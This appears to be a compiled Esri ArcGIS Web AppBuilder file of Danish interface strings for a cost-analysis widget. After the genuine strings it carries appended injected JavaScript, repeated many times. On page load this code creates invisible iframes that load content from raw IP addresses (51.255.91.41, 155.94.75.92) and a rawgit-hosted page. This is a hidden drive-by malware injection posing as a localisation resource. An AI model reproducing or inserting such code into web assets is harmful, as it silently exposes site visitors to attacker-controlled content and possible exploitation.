// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/CostAnalysis/setting/nls/strings":{configText:"Angiv konfigurationstekst:",generalSettings:{tabTitle:"Generelle indstillinger",measurementUnitLabel:"M\u00e5leenhed",currencyLabel:"M\u00e5lesymbol",roundCostLabel:"Afrundet omkostning",projectOutputSettings:"Projekt-outputindstillinger",typeOfProjectAreaLabel:"Projektomr\u00e5detype",bufferDistanceLabel:"Bufferafstand",roundCostValues:{twoDecimalPoint:"To decimaler",nearestWholeNumber:"N\u00e6rmeste hele tal",nearestTen:"N\u00e6rmeste tier",
nearestHundred:"N\u00e6rmeste hundrede",nearestThousand:"N\u00e6rmeste tusinde",nearestTenThousands:"N\u00e6rmeste titusinde"},projectAreaType:{outline:"Kontur",buffer:"Buffer"},errorMessages:{currency:"Ugyldig valutaenhed",bufferDistance:"Ugyldig bufferafstand",outOfRangebufferDistance:"V\u00e6rdien skulle v\u00e6re st\u00f8rre end 0 og mindre end eller lig med 100"}},projectSettings:{tabTitle:"Projektindstillinger",costingGeometrySectionTitle:"Definer geografi vedr\u00f8rende omkostning (valgfrit)",
costingGeometrySectionNote:"Bem\u00e6rk: Konfiguration af dette lag vil g\u00f8re det muligt for brugeren at angive omkostningsligninger for objektskabeloner baseret p\u00e5 geografi.",projectTableSectionTitle:"Mulighed for at gemme/indl\u00e6se projektindstillinger (valgfrit)",projectTableSectionNote:"Bem\u00e6rk: Konfiguration af alle tabeller og lag vil g\u00f8re det muligt for brugeren at gemme/indl\u00e6se projekter til senere brug.",costingGeometryLayerLabel:"Omkostningsgeometrilag",fieldLabelGeography:"Feltetiket-geografi",
projectAssetsTableLabel:"Tabel over projektaktiver",projectMultiplierTableLabel:"Tabel over multiplikator for yderligere projektomkostninger",projectLayerLabel:"Projektlag",configureFieldsLabel:"Konfigur\u00e9r felter",fieldDescriptionHeaderTitle:"Feltbeskrivelse",layerFieldsHeaderTitle:"Lagfelt",selectLabel:"V\u00e6lg",errorMessages:{duplicateLayerSelection:"${layerName} er allerede blevet valgt",invalidConfiguration:"V\u00e6lg ${fieldsString}"},costingGeometryHelp:"\x3cp\x3ePolygonlag med f\u00f8lgende betingelser vil blive vist: \x3cbr/\x3e \x3cli\x3e\tLaget skal have en foresp\u00f8rgselsfunktion\x3c/li\x3e\x3cli\x3e\tLaget skal have et Globalt ID-felt\x3c/li\x3e\x3c/p\x3e",
fieldToLabelGeographyHelp:"\x3cp\x3eStrengen og de numeriske felter for det valgte omkostningsgeometrilag vil blive vist i rullemenuen Felt til etiketgeografi.\x3c/p\x3e",projectAssetsTableHelp:"\x3cp\x3eTabel(ler) med f\u00f8lgende betingelser vil blive vist: \x3cbr/\x3e \x3cli\x3eTabellen skal have redigeringsfunktioner, nemlig Opret, Slet og Opdat\u00e9r\u009d\x3c/li\x3e    \x3cli\x3eTabellen skal have seks felter med pr\u00e6cist navn og datatype:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tAssetGUID (GUID-typefelt)\x3c/li\x3e\x3cli\x3e\tCostEquation (Strengtypefelt)\x3c/li\x3e\x3cli\x3e\tScenario (Strengtypefelt)\x3c/li\x3e\x3cli\x3e\tTemplateName (Strengtypefelt)\x3c/li\x3e\x3cli\x3e    GeographyGUID (GUID-typefelt)\x3c/li\x3e\x3cli\x3e\tProjectGUID (GUID-typefelt)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectMultiplierTableHelp:"\x3cp\x3eTabel(ler) med f\u00f8lgende betingelser vil blive vist: \x3cbr/\x3e \x3cli\x3eTabellen skal have redigeringsfunktioner, nemlig Opret, Slet og Opdat\u00e9r\u009d\x3c/li\x3e    \x3cli\x3eTabellen skal have fem felter med pr\u00e6cist navn og datatype:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tBeskrivelse (Strengtypefelt)\x3c/li\x3e\x3cli\x3e\tType (Strengtypefelt)\x3c/li\x3e\x3cli\x3e\tV\u00e6rdi (Float/Double-typefelt)\x3c/li\x3e\x3cli\x3e\tCostindex (Heltalstypefelt)\x3c/li\x3e\x3cli\x3e   \tProjectGUID (GUID-typefelt))\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectLayerHelp:"\x3cp\x3ePolygonlag med f\u00f8lgende betingelser vil blive vist: \x3cbr/\x3e \x3cli\x3eLaget skal have redigeringsfunktioner, nemlig Opret, Slet og Opdat\u00e9r\u009d\x3c/li\x3e    \x3cli\x3eLaget skal have fem felter med pr\u00e6cist navn og datatype:\x3c/li\x3e\x3cul\x3e\x3cli\x3eProjectName (Strengtypefelt)\x3c/li\x3e\x3cli\x3eBeskrivelse (Strengtypefelt)\x3c/li\x3e\x3cli\x3eTotalassetcost (Float/Double-typefelt)\x3c/li\x3e\x3cli\x3eGrossprojectcost (Float/Double-typefelt)\x3c/li\x3e\x3cli\x3eGlobalID (GlobalID-typefelt)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e"},
layerSettings:{tabTitle:"Lagindstillinger",layerNameHeaderTitle:"Navn p\u00e5 lag",layerNameHeaderTooltip:"Liste over lag i kortet",EditableLayerHeaderTitle:"Redig\u00e9rbar",EditableLayerHeaderTooltip:"Medtag laget og dets skabeloner i omkostnings-widget'en",SelectableLayerHeaderTitle:"Kan v\u00e6lges",SelectableLayerHeaderTooltip:"Geometrien fra objektet kan bruges til at genere et nyt omkostningselement",fieldPickerHeaderTitle:"Projekt-ID (valgfrit)",fieldPickerHeaderTooltip:"Valgfrit felt (af strengtypen) til lagring af Projekt-ID",
selectLabel:"V\u00e6lg",noAssetLayersAvailable:"Intet aktivlag fundet i det valgte webkort",disableEditableCheckboxTooltip:"Dette lag har ikke nogen redigeringsfunktioner"},costingInfo:{tabTitle:"Omkostningsoplysninger",proposedMainsLabel:"Foresl\u00e5et hoved",addCostingTemplateLabel:"Tilf\u00f8j omkostningsskabelon",manageScenariosTitle:"Administr\u00e9r scenarier",featureTemplateTitle:"Objektskabelon",costEquationTitle:"Omkostningsligning",geographyTitle:"Geografi",scenarioTitle:"Scenarie",actionTitle:"Handlinger",
scenarioNameLabel:"Scenarienavn",addBtnLabel:"Tilf\u00f8j",srNoLabel:"Nej.",deleteLabel:"Slet",duplicateScenarioName:"Dobbelt forekomst af scenarienavn",hintText:"\x3cdiv\x3eTip: Brug f\u00f8lgende n\u00f8gleord\x3c/div\x3e\x3cul\x3e\x3cli\x3e\x3cb\x3e{TOTALCOUNT}\x3c/b\x3e: Bruger det samlede antal af den samme type aktiv i en geografi\x3c/li\x3e\x3cli\x3e\x3cb\x3e{MEASURE}\x3c/b\x3e: Bruger l\u00e6ngde for linjeaktivet og omr\u00e5de for polygonaktiv\x3c/li\x3e\x3cli\x3e\x3cb\x3e{TOTALMEASURE}\x3c/b\x3e: Bruger den samlede l\u00e6ngde for linjeaktivet og det samlede omr\u00e5de for polygonaktivet af samme type i en geografi\x3c/li\x3e\x3c/ul\x3eDu kan bruge funktioner, s\u00e5som:\x3cul\x3e\x3cli\x3eMath.abs(-100)\x3c/li\x3e\x3cli\x3eMath.floor({TOTALMEASURE})\x3c/li\x3e\x3c/ul\x3eRedig\u00e9r omkostningsligningen ud fra dine projektbehov.",
noneValue:"Ingen",requiredCostEquation:"Ugyldig omkostningsligning for ${layerName} : ${templateName}",duplicateTemplateMessage:"Dobbelt forekommende skabelonpost findes for ${layerName} : ${templateName}",defaultEquationRequired:"Standardligning kr\u00e6ves for ${layerName} : ${templateName}",validCostEquationMessage:"Angiv en gyldig omkostningsligning",costEquationHelpText:"Redig\u00e9r omkostningsligningen ud fra dine projektbehov",scenarioHelpText:"V\u00e6lg scenarie ud fra dine projektbehov",
copyRowTitle:"Kopi\u00e9r r\u00e6kke",noTemplateAvailable:"Tilf\u00f8j mindst \u00e9n skabelon for ${layerName}",manageScenarioLabel:"Administr\u00e9r scenarie",noLayerMessage:"Angiv mindst \u00e9t lag i ${tabName}",noEditableLayersAvailable:"Lag(ene) skal markeres som redig\u00e9rbare p\u00e5 fanen med lagindstillinger"},statisticsSettings:{tabTitle:"Statistik-indstillinger",addStatisticsLabel:"Tilf\u00f8j statistik",fieldNameTitle:"Felt",statisticsTitle:"M\u00e6rke",addNewStatisticsText:"Tilf\u00f8j ny statistik",
deleteStatisticsText:"Slet statistik",moveStatisticsUpText:"Flyt statistik op",moveStatisticsDownText:"Flyt statistik ned",selectDeselectAllTitle:"V\u00e6lg alle"},statisticsType:{countLabel:"T\u00e6lling",averageLabel:"Gennemsnit",maxLabel:"Maksimum",minLabel:"Minimum",summationLabel:"Summering",areaLabel:"Omr\u00e5de",lengthLabel:"L\u00e6ngde"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});